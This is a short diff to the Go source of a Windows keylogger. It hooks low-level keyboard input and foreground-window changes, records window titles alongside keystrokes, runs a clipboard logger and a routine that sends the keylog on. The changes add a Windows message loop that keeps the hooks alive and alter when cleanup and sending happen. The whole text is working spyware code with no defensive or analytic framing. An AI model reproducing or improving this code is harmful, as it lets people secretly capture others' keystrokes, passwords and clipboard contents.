@@ -14,6 +14,7 @@ func startLogger(mode int) {
 		go startListening()
 		go clipboardLogger()
 		go sendKeylog(ch)
+		go cleanup()
 	} else {
 		//Selective Keylogger
 	}
@@ -24,9 +25,9 @@ func windowLogger(hook w32.HWINEVENTHOOK, event w32.DWORD, hwnd w32.HWND, idObje
 		title := w32.GetWindowText(hwnd)
 		tmpKeylog.WriteString("\r\n[" + title + "]\r\n")
 	}
-	if tmpKeylog.Len() >= 1000 || false {
-		ch <- struct{}{}
-	}
+	// if tmpKeylog.Len() >= 2000 || false {
+	// 	ch <- struct{}{}
+	// }
 	return 0
 }
 
@@ -472,8 +473,9 @@ func keyLogger(nCode int, wparam w32.WPARAM, lparam w32.LPARAM) w32.LRESULT {
 func startListening() {
 	keyboardHook = w32.SetWindowsHookEx(w32.WH_KEYBOARD_LL, keyLogger, 0, 0)
 	gHook = w32.SetWinEventHook(w32.EVENT_SYSTEM_FOREGROUND, w32.EVENT_SYSTEM_FOREGROUND, 0, windowLogger, 0, 0, w32.WINEVENT_SKIPOWNPROCESS)
-	cleanup()
-	// quit <- struct{}{}
+	var msg w32.MSG
+	for w32.GetMessage(&msg, 0, 0, 0) != 0 {
+	}
 }
 
 func cleanup() {
